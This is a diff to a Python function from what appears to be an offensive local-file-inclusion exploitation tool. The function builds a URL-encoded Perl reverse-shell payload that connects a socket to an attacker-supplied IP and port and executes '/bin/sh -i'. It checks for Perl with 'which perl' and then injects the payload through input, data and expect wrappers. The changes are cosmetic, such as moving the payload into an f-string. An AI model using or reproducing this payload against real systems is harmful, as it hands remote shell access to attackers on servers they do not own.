@@ -1,7 +1,7 @@
+"""Perl"""
 from src.httpreqs import request
 from src.configs import config
 from src.utils.encodings import encode
-from src.utils.args_check import headers
 from src.utils.arguments import args
 from src.attacks.logPoison import exploit_log_poison
 from src.utils.info import printInfo
@@ -9,17 +9,13 @@ from src.utils import colors
 
 
 def exploit_perl(exploit, method, ip, port):
-
+    """Exploit perl"""
     url = exploit["GETVAL"]
     post = exploit["POSTVAL"]
 
     perlTest = "which%20perl"
     perlPayload = (
-        "perl+-e+'use+Socket%3b$i%3d\""
-        + ip
-        + '"%3b$p%3d'
-        + str(port)
-        + "%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname"
+        f"perl+-e+'use+Socket%3b$i%3d\"{ip}\"%3b$p%3d{port}%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname"
         '("tcp"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">%26S")%3bopen(STDOUT,">%26S")%3bopen'
         '(STDERR,">%26S")%3bexec("/bin/sh+-i")%3b}%3b\''
     )
@@ -37,6 +33,7 @@ def exploit_perl(exploit, method, ip, port):
             "",
             "",
         )
+
         if "/bin" in res.text and "/perl" in res.text:
             u = url.replace(config.tempArg, encode(perlPayload))
             printInfo(ip, port, "perl", "input wrapper")
@@ -63,6 +60,7 @@ def exploit_perl(exploit, method, ip, port):
                 "",
                 "",
             )
+
         if "/bin" in res.text and "/perl" in res.text:
             printInfo(ip, port, "perl", "data wrapper")
             if args.postreq:
@@ -103,6 +101,7 @@ def exploit_perl(exploit, method, ip, port):
                 "",
                 "",
             )
+
         if "/bin" in res.text and "/perl" in res.text:
             printInfo(ip, port, "perl", "expect wrapper")
             if args.postreq:
